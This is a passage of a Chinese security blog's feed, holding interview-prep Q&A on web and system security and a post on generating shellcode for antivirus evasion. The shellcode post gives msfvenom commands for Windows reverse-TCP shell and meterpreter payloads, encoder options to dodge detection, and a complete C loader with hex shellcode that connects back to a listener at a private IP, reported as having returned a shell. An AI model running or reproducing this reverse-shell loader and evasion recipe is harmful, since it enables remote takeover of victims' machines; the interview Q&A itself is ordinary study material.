start="18"><li>HttpOnly</li></ol><p>这是cookie中的一个参数。如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，增加了cookie安全性。</p><ol start="19"><li>a.baidu.com和b.baidu.com是否同源</li></ol><p>源：主机，域名，端口。同源要求三者必须都相同，而这两个域名不同，因此不属于同源。</p><ol start="20"><li>算法？了解过什么排序？</li></ol><p>个人理解的算法就是解决某一类问题的通用方式。<br>排序算法有：冒泡排序，选择排序，插入排序，希尔排序，归并排序，快速排序，堆排序，计数排序，桶排序，基数排序。<br><img src="/simg/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%801.png" alt="排序"></p><ol start="21"><li>爬虫</li></ol><p>爬虫是一种用来自动浏览万维网的网络机器人。<br>会写python爬虫。</p><ol start="22"><li>页面存在很多js的时候，用什么</li></ol><p>如果需要操纵浏览器拿到浏览器显示出来的数据，可以使用selenium模块。</p><p>当页面存在很多js时，要分析如何找到是哪个js在控制数据的生成及js发送请求的路径<br>首先拿到详情页的请求路径：<br><code>url_1=&#39;https://www.example.com/a/b.html&#39;</code><br>然后把url_1最后一个斜杠后面的内容替换掉，<br><code>url_2=&#39;https://www.example.com/%s/c.js&#39;%(url_1.split(&#39;/&#39;)[3])</code><br>把url_1用 <code>/</code> 分割，拿到第四部分，即索引为3，然后拼接进去即可<br>这样就构造好了一个详情页数据请求路径，然后直接去访问这个路径就能拿到数据，也不用再访问详情页。</p><ol start="23"><li>爬虫的待爬取URL量级比较大的时候，如何对其去重</li></ol><p>使用布隆过滤器。<br>原理：<br>BloomFilter会开辟一个m位的bitArrary(位数组)，开始所有数据全部置为0。当一个元素( <code>www.baidu.com</code> )过来时，能过多个哈希函数(h1,h2,h3…)计算不同的在哈希值，并通过哈希值找到对应的bitArray下标处，将里面的值0置位1。</p><ol start="24"><li>多线程，异步，协程，多路复用 用哪一个最快，为什么？</li></ol><p>多线程？not sure</p><ol start="25"><li>浏览器的常用编码</li></ol><p>UTF-8<br>UTF-16</p><ol start="26"><li>web常用的加密算法有什么？</li></ol><p>不可逆：MD5，SHA-256<br>对称：DES，AES<br>非对称：RSA</p><ol start="27"><li>病毒和蠕虫的区别？</li></ol><p>蠕虫和病毒都会自我复制。<br>区别：<br>蠕虫：蠕虫不依附于计算机上的其它程序或文件。不需要人工干预，利用漏洞主动攻击，具有较强的独立性。<br>病毒：病毒把自身附加于程序或者文件，从一台计算机传播到另一台计算机，当运行程序或者打开文件时，才会感染计算机。在没有人为操作的情况下，病毒无法传播，必须通过外部操作来触发他。</p><ol start="28"><li>DNS欺骗</li></ol><p>DNS欺骗就是攻击者在域名解析请求的过程中冒充DNS域名服务器进行响应，回复给用户一个虚假的地址，也就是攻击者冒充顶替域名服务器的一种欺骗行为。<br>原理：攻击者冒充域名服务器，将目标IP地址设为自己的IP地址，接着，用户访问时就进入到攻击者的主页里，将原来的域名网站冒充顶替掉了，这就是DNS欺骗的基本原理。</p><ol start="29"><li>移动端的调试经验 apk，ipa包分析</li></ol><p>不太了解。参考下面两篇文章：<br><a href="https://juejin.cn/post/7264235181778960421">Android-使用 APK 分析器分析 build</a><br><a href="https://juejin.cn/post/7185079396678991928">iOS 包体积优化1 - 总览</a></p><ol start="30"><li>对于云安全的理解</li></ol><p>云安全定义:<br>云安全是为保护云端应用、数据和基础架构安全而采取的一套信息安全措施。这涉及应用各种安全政策、实践、控制措施以及诸如身份和访问权限管理和数据泄露防护工具等其他方法，目的是帮助保护云环境免受未经授权的访问、在线攻击和内部威胁的侵害。</p><p>云安全的工作原理:<br>云安全主要关注如何搭配实现各种策略、流程和技术，以确保实现数据保护、支持法规遵从，并为用户和设备提供对隐私、访问和身份验证方面的控制措施。<br>云服务提供商 (CSP) 通常采用责任共担模型，这意味着，实现云计算安全既是云服务提供商的责任，也是您（即客户）的责任。您可以将该模型看作一个责任框架，用以界定哪些安全任务归云服务提供商负责，哪些又是客户的职责。<br>一般来说，CSP始终负责云及其核心基础架构的安全，而客户则应保护在云端运行的所有内容的安全，例如网络控件、身份和访问权限管理、数据和应用。</p><p>云安全的安全风险：<br>来自外部：数据泄露和数据丢失、钓鱼式攻击、恶意软件、DDoS 攻击和易受攻击的 API。<br>来自内部：缺少洞察性、配置不当、访问权限管理、动态工作加载、法规遵从。</p><p>云安全的优势：<br>更高的可见性、集中式安全性、减少费用、数据保护、云合规性、高级威胁检测。</p><p><a href="https://cloud.google.com/learn/what-is-cloud-security?hl=zh-cn">云安全参考资料</a></p><ol start="31"><li>虚拟机逃逸的理解</li></ol><p>虚拟机逃逸(Virtual Machine Escape)是一种网络安全攻击技术，指的是攻击者通过利用虚拟机(VM)内的漏洞或设计缺陷，实现从虚拟机内部向宿主机(Host)的操作系统进行攻击。<br>虚拟机逃逸攻击的原理很大程度上依赖于虚拟化技术的实现方式。虚拟化技术通常由Hypervisor负责，其主要任务是管理和调度多个虚拟机之间的资源分配。在虚拟机逃逸攻击中，攻击者寻找并利用虚拟机监视器的漏洞或设计缺陷，绕过虚拟机与宿主机之间的隔离层，实现对宿主机的操作系统及其资源的访问和控制。<br>通常包括以下几种类型：<br>(1) 利用虚拟机监视器漏洞，如缓冲区溢出、整数溢出等，攻击者通过这些漏洞实现代码执行，最终获得宿主机的控制权限。<br>(2) 利用虚拟设备或驱动程序的设计缺陷，攻击者可能通过虚拟网络接口、虚拟磁盘等设备逃出虚拟机环境。<br>(3) 利用虚拟机管理工具和接口的安全漏洞，例如虚拟机控制台、虚拟机迁移等，攻击者可能在不被察觉的情况下实现虚拟机逃逸。</p><p>举例：QEMU逃逸（CVE-2020-14364）<br><a href="https://blog.nsfocus.net/virtual/">虚拟机逃逸技术介绍</a><br><a href="https://xz.aliyun.com/t/12540">FreeBSD系统的虚拟机逃逸漏洞</a></p><ol start="32"><li>dll文件是什么意思，有什么用？DLL劫持原理</li></ol><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序扩展”，是软件文件类型。<br>在Windows系统中，许多应用程序不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。<br>用处：使用DLL有助于促进代码的模块化、代码重用、内存的有效使用和减少所占用的磁盘空间。<br><a href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/dynamic-link-library">什么是 DLL</a></p><p>DLL劫持原理：<br>如果在进程尝试加载一个DLL时没有并没有指定DLL的绝对路径，那么Windows会尝试去按照顺序搜索这些特定目录来查找这个DLL,如果攻击者能够将恶意的DLL放在优先于正常DLL所在的目录，那么就能够欺骗系统去加载恶意的DLL，形成”劫持”,CWE将其归类为UntrustedSearch Path Vulnerability,比较直译的一种解释。<br><a href="https://www.freebuf.com/articles/endpoint/366348.html">DLL劫持从零到CobaltStrike上线免杀</a><br><a href="https://www.mayuexuan.com/dll%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/">DLL劫持原理</a></p><ol start="33"><li>get传参和post传参有什么区别？</li></ol><p>(1) GET请求只能进行URI编码，而POST支持多种编码方式。<br>(2) 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。<br>(3) GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。<br>(4) GET参数通过URL传递，而且是有长度限制的，POST放在请求体中，没有长度限制。</p><ol start="34"><li>讲一下HTTPS双向认证</li></ol><p>(1) 客户端发起建立HTTPS连接请求，将SSL协议版本的信息发送给服务端<br>(2) 服务端将本机的公钥证书(server.crt)发送给客户端<br>(3) 客户端读取公钥证书(servet.crt)，取出服务端公钥<br>(4) 客户端将客户端公钥证书(client.crt)发送给服务器端<br>(5) 服务器端使用根证书(root.crt)解密客户端公钥证书，拿到客户端公钥<br>(6) 客户端发送自己支持的加密方案给服务器端<br>(7) 服务器端根据自己和客户端的能力，选择一个双方都能接受的加密方案，使用客户端的公钥加密后发送给客户端<br>(8) 客户端使用自己的私钥解密加密方案，生成一个随机数R，使用服务器公钥加密后传给服务器端<br>(9) 服务器端用自己的私钥去解密这个密文，得到了密钥R<br>(10) 服务器端和客户端在后续通讯过程就使用这个密钥R进行通信了</p><ol start="35"><li>http的请求方式，具体说说</li></ol><p>见问题16</p><ol start="36"><li>常见的http方法有哪些，他们之间的区别是什么？</li></ol><p>见问题16</p><ol start="37"><li>常见状态码你知道吗？分别说一下200，201，301，302，500，503的含义</li></ol><p>200–请求成功，一般用于GET和POST请求<br>201–已创建，成功请求并创建了新的资源<br>301–永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替<br>302–临时移动。与301类似。但资源只是临时被移动。客户端应使用原有URI<br>500–服务器内部错误，无法完成请求<br>503–由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中。</p><ol start="38"><li>常见请求消息头的作用，分别说一下cookie, referer, user-agent的作用？</li></ol><p>HTTP头字段(HTTP header fields)，是指在超文本传输协议(HTTP)的请求和响应消息中的消息头部分。<br>Cookie: 服务器通过Set-Cookie发送的一个超文本传输协议Cookie<br>Referer: 判断请求来源，以及防止盗链。<br>User-Agent: 浏览器身份标识字符串</p><ol start="39"><li>响应消息头的作用，分别说一下location, Access-Control-Allow-Origin, WWW-Authenticate</li></ol><p>Location: 表示客户应当到哪里去提取文档，用于接收端定位到资源的位置(URL)上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态码302<br>Access-Control-Allow-Origin: 携带了服务端验证后允许的跨域请求域名。<br>WWW-Authenticate: 表明客户端请求实体应该使用的授权方案</p><ol start="40"><li>Cookie响应消息头的secure和httponly分别作用是什么？</li></ol><p>见问题3</p><ol start="41"><li>静态、动态语言区别</li></ol><p>动态语言（弱类型语言）：是运行时才确定数据类型的语言，变量在使用之前无需申明类型，通常变量的值是被赋值的那个值的类型。比如PHP、ASP、JavaScript、python、Perl<br>静态语言（强类型语言）：是编译时变量的数据类型就可以确定的语言，大多数静态语言要求在使用变量之前就必须声明数据类型。比如Java, C, C++, C#</p><p>区别：<br>静态语言由于强制声明数据类型，让开发工具(IDE)对代码有很强的判断能力，在实现复杂的业务逻辑和开发大型商业系统、以及那些声明周期很长的应用中，开发者可以依托强大的IDE来更高效更安全地开发。<br>动态语言代码量更少，看起来更简洁；思维不受约束，可以任意发挥，把更多的精力放在产品本身上；集中思考业务逻辑实现，思考过程就是实现过程。</p><ol start="42"><li>常用的脚本语言和数据库有哪些？</li></ol><p>常用脚本语言：js，php，ruby，python<br>常用数据库：Oracle，MySQL，SQL server，mssql，redis</p><ol start="43"><li>系统、脚本语言、中间件如何组合？</li></ol><p>数据库：Oracle大型数据库、Access、SQL Server(ms SQL)、MySQL常用中小型数据库<br>中间件：IIS、Apache、Nginx、Tomcat<br>脚本：PHP、ASP、ASPX(ASP.NET)、JSP</p><p>综合搭配：<br>Linux + Apache + PHP +MySQL<br>Linux + Nginx + PHP + MySQL<br>Windows + IIS +ASPX(ASP.NET) + SQL Server(ms SQL)<br>Linux + Tomcat + JSP +MySQL<br>Linux + Tomcat + JSP + Oracle</p><ol start="44"><li>会不会逆向APK，会不会嵌入式</li></ol><p>了解过一点。</p><p>直接修改 <code>xxx.apk</code> 的后缀为 <code>xxx.zip</code> ，解压文件目录。<br><img src="/simg/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%802.png" alt="计算机基础2"><br>所有的代码处于 <code>classes.dex</code> 中，图片布局等资源处于 <code>res</code> 目录下。 <code>AndroidManifest.xml</code> 和 <code>activity_main.xml</code> 文件是一堆整齐排列的16进制数，需要使用apktool（反编译资源），反编译APK中的资源。</p><p>经过apktool反编译后生成的具体文件：<br><img src="/simg/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%803.png" alt="计算机基础3"><br>1、AndroidManifest.xml：经过反编译还原后的 manifest 文件<br>2、original 文件夹：存放了未经反编译过、原始的 AndroidManifest.xml 文件<br>3、res 文件夹：存放了反编译出来的所有资源<br>4、smali 文件夹：存放了反编译出来的所有代码，只不过格式都是.smali类型的</p><p>使用 apktool 反编译后的代码处于 smali 文件夹下，且都是.smali格式的<br>将其转换成能看懂的Java代码（反编译代码）：使用dex2jar + jd-gui</p><p>dex2jar的作用是将dex文件转换为jar文件<br>jd-gui查看jar包里的具体内容</p><p>修改完成后用apktool将文件夹重新打包成apk，然后使用 AndroidStudio 生成一个签名文件。最后再执行签名命令即可安装。<br><a href="https://juejin.cn/post/7158107697907236878">Android逆向</a></p><p>嵌入式只了解一点概念，是一种嵌入机械或电气系统内部、具有专一功能和实时计算机性能的电脑系统。</p><ol start="45"><li>正则能不能写？</li></ol><p>能写。<br><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式</a></p><ol start="46"><li>对https了解吗？讲一下加密和解密流程？</li></ol><p>HTTPS(Hypertext Transfer Protocol Secure: 超文本传输安全协议) 是一种透过计算机网络进行安全通信的传输协议。<br>HTTPS经由HTTP通信，但利用SSL&#x2F;TLS来加密数据包。HTTPS开发的主要目的是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。<br>加解密流程见问题11。</p><ol start="47"><li>陈述一下缓冲区溢出</li></ol><p>缓冲区溢出是一种异常现象，当软件向缓冲区中写入数据使缓冲区容量溢出时，会导致相邻存储器位置被覆盖。过量信息被传递到没有足够空间的容器中，而这些信息最终会替换相邻容器中的数据。攻击者可以利用缓冲区溢出修改计算机的内存，以破坏或控制程序的执行。<br>造成此现象的原因有：</p><ul><li>存在缺陷的程序设计</li><li>尤其是C语言，不像其它一些高级语言会自动进行数组或指针的堆栈区块边界检查，增加溢出风险。</li><li>C语言中的C标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</li></ul><p><a href="https://zh.wikipedia.org/zh-sg/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">缓冲区溢出</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;地基。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="计算机基础" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之语言篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AF%AD%E8%A8%80%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AF%AD%E8%A8%80%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-09-04T02:54:09.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>语言基础是地基。</p><span id="more"></span><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ol><li><p>php.ini可以设置哪些安全特性？</p></li><li><p>php的%00截断原理是什么？</p></li><li><p>php中命令执行涉及到的函数</p></li><li><p>代码执行、文件读取、命令执行的函数都有哪些？</p></li><li><p>PHP审计流程</p></li><li><p>vender目录</p></li><li><p>phpunit</p></li><li><p>php可以构造无文件shell吗？</p></li><li><p>PHP常见漏洞对应函数（命令执行，代码执行，文件包含，文件上传，文件删除，SSRF）</p></li><li><p>PHP的安全特性有关注吗？</p></li><li><p>代码审计（mvc&#x2F;非mvc）</p></li><li><p>简述PHP中造成任意文件下载漏洞的常见函数，以及造成漏洞的原因。</p></li><li><p>PHP作为弱类型语言，在底层它是怎么判断变量的类型的？</p></li></ol><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><ol><li><p>img标签除了onerror属性外，还有其它获取管理员路径的办法吗？</p></li><li><p>img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径？</p></li></ol><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><ol><li><p>命令的函数&#x2F;包</p></li><li><p>Java审计流程，一般关注哪些洞，或擅长挖哪些类型？</p></li><li><p>tomcat做回显</p></li><li><p>内存马的实现</p></li><li><p>Java执行命令的几种方式</p></li><li><p>反射，代理，类加载这些熟悉吗</p></li><li><p>代码审计</p></li><li></li></ol><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><ol><li><p>是否写过非脚本工具</p></li><li><p>代码审计</p></li><li><p>写出任意一种漏洞检测代码，用python实现</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;语言基础是地基。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="语言" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ShellCode获取</title>
    <link href="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/"/>
    <id>http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/</id>
    <published>2023-08-31T16:00:00.000Z</published>
    <updated>2023-09-01T06:01:34.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shellcode的入门使用。</p><span id="more"></span><h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode是16进制的机器码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，放入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p><p>shellcode可以按照攻击者控制是否在目标机器上执行载荷分为本地shellcode和远程shellcode。本地运行的shellcode经常用于在攻击者对计算机的访问权限有限，需要利用软件漏洞提升权限；远程shellcode常用于攻击者以运行在某个网络中的另一台机器上的易受攻击的进程为目标时，如果成功执行，shellcode可以通过网络访问目标主机。</p><h1 id="直接获取shellcode"><a href="#直接获取shellcode" class="headerlink" title="直接获取shellcode"></a>直接获取shellcode</h1><p>网络上有许多已经编写好的shellcode资源公开分享，由于shellcode的本质是一段机器码，在不同的硬件设备上可能有诸多区别，在使用时一定要注意平台是否通用。下面是一个可以学习的网站。<br><a href="https://www.exploit-db.com/">Exploit Database</a><br>但来自网络的资源很有可能由于久久未更新、适用的系统已经被淘汰，或者是shellcode已经被公开而变得容易被查杀，这时候我们就需要能够即时获取shellcode的方法。</p><h1 id="通过软件获取shellcode"><a href="#通过软件获取shellcode" class="headerlink" title="通过软件获取shellcode"></a>通过软件获取shellcode</h1><h2 id="CobaltStrike-Ver-4-0"><a href="#CobaltStrike-Ver-4-0" class="headerlink" title="CobaltStrike(Ver 4.0)"></a>CobaltStrike(Ver 4.0)</h2><p><img src="/simg/shellcode_1.png" alt="cs"><br>勾选生成c语言形式的shellcode，在下拉列表里我们还能看到有许多其他语言形式的shellcode。<br><img src="/simg/shellcode_2.png" alt="cs"><br>接着我们会得到一个文件，其中包含了所需的shellcode，只要将这段shellcode放入预先写好的加载器中就可以使用了：<br><img src="/simg/shellcode_3.png" alt=" "></p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>MsfVenom 集成了msfpayload 和msfencode的功能，用于生成各种类型的payload</p><ol><li><p>首先查看可用的payload类型，需要Windows平台下的shellcode进行实验，所以使用命令<br><code>msfvenom --list payload |grep windows</code><br>挑选一个反弹shell的payload <code>windows/shell/reverse_tcp</code></p></li><li><p>查看支持的平台架构<br><code>msfvenom -p windows/shell/reverse_tcp --list archs</code><br>选择x64平台<br>实际测试中，要根据payload选择对应的平台，否则会提示Error: The selected arch is incompatible with the payload。<br>除此之外，本次测试中生成x64架构的shellcode并不能直接用c语言加载，可能是由于测试使用的gcc编译器是32位的。选择x86架构正常加载。</p></li><li><p>查看可用的payload格式<br><code>msfvenom -p windows/shell/reverse_tcp -a x64 --list formats</code><br>选择c语言格式的payload</p></li><li><p>使用–list-options查看payload需要配置的参数<br><code>msfvenom -p windows/shell/reverse_tcp --list-options</code></p></li><li><p>生成payload<br><code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.31.1 LPORT=2333 -a x86 -f c</code><br><img src="/simg/shellcode_4.png" alt=" "></p></li></ol><p>接下来开始测试生成的shellcode是否可用<br>首先使用msf设置好监听<br><img src="/simg/shellcode_5.png" alt=" "></p><p>将生成的shellcode放入c语言加载器中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x1f\x12\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行<br><img src="/simg/shellcode_7.png" alt=" "><br>成功弹回shell</p><p>接下来尝试弹回一个功能更强大的meterpreter<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -a x86 -f c</code></p><p>重新生成shellcode并在加载器中更换<br><img src="/simg/shellcode_8.png" alt=" "></p><h3 id="编码器的使用"><a href="#编码器的使用" class="headerlink" title="编码器的使用"></a>编码器的使用</h3><p>查看可用的编码器<br><code>msfvenom --list encoders</code><br><img src="/simg/shellcode_9.png" alt=" "></p><p>使用-e参数指定一个编码方式，使用-i参数指定编码次数<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -e x86/xor_dynamic -i 5 -a x86 -f c</code><br><img src="/simg/shellcode_10.png" alt=" "><br>生成的shellcode与不加编码器确实有所不同，但是免杀效果几乎没有，不能作为真正的免杀解决方案</p><h3 id="避免使用某些字符"><a href="#避免使用某些字符" class="headerlink" title="避免使用某些字符"></a>避免使用某些字符</h3><p>-b 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中<br>当这个参数被添加的时候，msfvenom 将会自动寻找合适的编码器来编码 Payload<br><img src="/simg/shellcode_11.png" alt=" "></p><h3 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h3><p><a href="https://github.com/Axx8/shellcode_loader">ShellCode_Loader</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在实战中免杀效果不够。<br>免杀需要不断迭代，杀毒软件也会不断更新，没有永恒的免杀。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a><br><a href="https://luckyfuture.top/Msfvenom-Gen-ShellCode">使用MSF生成ShellCode</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;shellcode的入门使用。&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>免杀基础学习</title>
    <link href="http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-08-31T16:00:00.000Z</published>
    <updated>2023-09-03T02:35:39.084Z</updated>
    
